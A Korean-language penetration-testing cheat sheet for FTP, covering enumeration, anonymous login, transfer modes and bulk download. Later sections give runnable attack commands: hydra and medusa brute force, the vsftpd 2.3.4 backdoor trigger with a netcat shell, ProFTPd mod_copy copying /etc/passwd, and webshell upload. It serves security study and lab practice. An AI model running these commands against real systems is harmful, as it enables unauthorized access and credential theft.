# FTP

# FTP (21)

파일 전송 프로토콜. 익명 로그인, 브루트포스, 버전 취약점이 주요 공격 벡터.

---

## 개념

FTP는 포트 21(명령/제어)과 포트 20(데이터 전송) 두 채널을 사용한다. 명령 채널은 세션 동안 유지되고, 데이터 채널은 파일 전송마다 새로 열린다. 암호화가 없어 자격증명이 평문으로 전송되고 스니핑에 취약하다.

---

## 1. 열거

```bash
# nmap 스크립트 — 익명 로그인, 취약점, 버전 한번에
nmap -p 21 --script=ftp-anon,ftp-bounce,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 <IP>

# 익명 로그인 가능 여부만 확인
nmap -p 21 --script=ftp-anon <IP>

# 버전 탐지
nmap -sV -p 21 <IP>
```

---

## 2. 익명 로그인

```bash
# 기본 접속
ftp <IP>
# Username: anonymous
# Password: anonymous (또는 빈칸, 이메일 형식도 허용)

# -n 옵션: 자동 로그인 비활성화 (수동으로 로그인)
ftp -n <IP>
ftp> quote USER anonymous
ftp> quote PASS anonymous

# lftp로 더 편하게
lftp -u anonymous,anonymous <IP>
lftp> ls -la
lftp> get secret.txt
lftp> mirror .    # 전체 디렉토리 재귀 다운로드
```

---

## 3. 탐색 및 파일 수집

FTP는 쉘이 아니라 파일 전송 전용 프로토콜이다. `cat`, `sudo`, `ls -la` 같은 쉘 명령어는 동작하지 않으며, FTP 자체 명령어만 사용 가능하다.

```bash
ftp> ls              # 파일/디렉토리 목록
ftp> ls -la          # 숨김 파일 포함 목록
ftp> ls -R           # 재귀적으로 전체 디렉토리 목록 (구조 파악에 유용)
ftp> pwd             # 현재 경로 확인
ftp> cd Backups      # 디렉토리 이동 (디렉토리는 cd로 진입해야 함)
ftp> cd ..           # 상위 디렉토리
ftp> get passwd      # 단일 파일 다운로드
ftp> mget *.txt      # 다중 파일 다운로드 (확장자 필터)
ftp> prompt off      # 다중 다운로드 시 확인 프롬프트 비활성화
ftp> mget *          # 현재 디렉토리 전체 다운로드
ftp> put shell.php   # 파일 업로드 (쓰기 권한 있을 때)
```

주의사항:

- 디렉토리는 `get`으로 못 받음 → `cd`로 진입 후 내부 파일을 `get`
- `550 Access is denied` → 디렉토리에 `cd`로 진입 후 내부 파일을 `get`
- `?Invalid command` → FTP에 없는 쉘 명령어를 입력한 것

---

## 4. Binary 모드 (중요)

FTP는 ASCII 모드와 Binary 모드 두 가지 전송 방식을 지원한다. 기본값은 ASCII 모드다.

**ASCII 모드** — 텍스트 파일 전송용이다. 전송 중 줄 끝 문자(line ending)를 자동으로 변환한다. Windows는 CRLF(`\r\n`), Linux는 LF(`\n`)를 사용하는데 ASCII 모드에서 이를 자동으로 맞춰준다. 그러나 바이너리 파일에 적용하면 이 변환 과정에서 파일이 손상된다.

**Binary 모드** — 파일을 바이트 단위로 그대로 전송한다. 어떠한 변환도 없이 원본과 동일한 파일을 전송한다. `.zip`, `.exe`, `.mdb`, `.pdf`, 이미지 파일 등 모든 바이너리 파일은 반드시 Binary 모드로 받아야 한다.

```bash
# Binary 모드로 전환 (바이너리 파일 받기 전 필수)
ftp> binary
# 200 Type set to I.  (I = Image = Binary)

# ASCII 모드로 전환 (텍스트 파일용)
ftp> ascii
# 200 Type set to A.

# 현재 모드 확인
ftp> type

# Binary 모드로 전환 후 파일 다운로드
ftp> binary
ftp> get backup.mdb
ftp> get archive.zip
ftp> mget *.zip
```

**손상 예시** — `.mdb` 파일을 ASCII 모드로 받으면 바이트가 변조되어 mdbtools가 읽지 못한다. `mdb-tables backup.mdb` 실행 시 오류가 나거나 빈 결과가 나오면 Binary 모드로 다시 받아야 한다.

---

## 5. Active / Passive 모드

FTP 데이터 채널을 여는 방식이 두 가지다.

**Active 모드 (기본)** — 클라이언트가 PORT 명령으로 자신의 IP와 포트를 서버에 알려주고, 서버가 포트 20에서 클라이언트 쪽으로 데이터 연결을 시작한다. 서버가 클라이언트에 인바운드 연결을 하기 때문에 클라이언트 방화벽에 막히는 경우가 많다.

**Passive 모드** — 클라이언트가 PASV 명령을 보내면 서버가 임의의 높은 포트를 열어 알려주고, 클라이언트가 그 포트로 연결한다. 클라이언트가 모든 연결을 시작하므로 방화벽 문제가 적다.

`425 Cannot open data connection` 에러가 나오면 Passive 모드로 전환한다.

```bash
# Passive 모드로 전환
ftp> passive
# Passive mode on.

# 접속 시부터 passive 모드
ftp -p <IP>

# lftp는 기본으로 passive 사용
lftp <IP>
```

---

## 6. wget으로 전체 다운로드

```bash
# FTP 전체 디렉토리 재귀 다운로드
wget -r ftp://anonymous:anonymous@<IP>/

# 특정 디렉토리만
wget -r ftp://anonymous:anonymous@<IP>/Backups/

# 패스워드 있을 때
wget -r ftp://john:Password1!@<IP>/
```

---

## 7. 브루트포스

```bash
# hydra
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<IP>
hydra -L users.txt -P passwords.txt ftp://<IP> -t 10

# medusa
medusa -h <IP> -u admin -P rockyou.txt -M ftp

# nmap 스크립트
nmap -p 21 --script=ftp-brute --script-args userdb=users.txt,passdb=pass.txt <IP>
```

---

## 8. vsftpd 2.3.4 백도어 (CVE-2011-2523)

```bash
# 탐지: 버전 2.3.4 확인
nmap -sV -p 21 <IP>

# 수동 익스플로잇 (웃는 얼굴 :) 사용자로 트리거)
telnet <IP> 21
USER test:)
PASS anything
# 6200 포트로 백도어 쉘 오픈
nc <IP> 6200

# Metasploit
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS <IP>
exploit
```

---

## 9. ProFTPd 1.3.5 mod_copy (CVE-2015-3306)

```bash
# 인증 없이 파일 복사 가능
nc <IP> 21
CPFR /etc/passwd
CPTO /var/www/html/passwd.txt
# 브라우저로 http://<IP>/passwd.txt 접근

# 웹쉘 복사 (웹 루트 쓰기 가능할 때)
CPFR /home/user/shell.php
CPTO /var/www/html/shell.php
```

---

## 10. 쓰기 가능할 때 → 웹쉘 업로드

```bash
# 웹 루트에 쓰기 가능한 FTP 서버
ftp> binary
ftp> put shell.php

# 웹에서 접근
# http://<IP>/shell.php?cmd=id
```

---

## 팁

- 익명 로그인 가능하면 반드시 전체 파일 목록 확인 (`ls -la`, `ls -R`)
- **바이너리 파일은 항상 `binary` 명령 먼저** — `.mdb`, `.zip`, `.exe`, `.pdf` 등
- `425 Cannot open data connection` → `passive` 명령으로 해결
- `550 Access is denied` → 디렉토리에 `cd`로 진입 후 내부 파일을 `get`
- `?Invalid command` → FTP 전용 명령어만 사용 가능 (쉘 명령어 안 됨)
- FTP에서 디렉토리는 `get`으로 못 받음 → `cd`로 진입 후 내부 파일을 `get`
- 파일 받은 후 내용이 깨져 있으면 ASCII 모드로 받은 것 → `binary` 후 재다운로드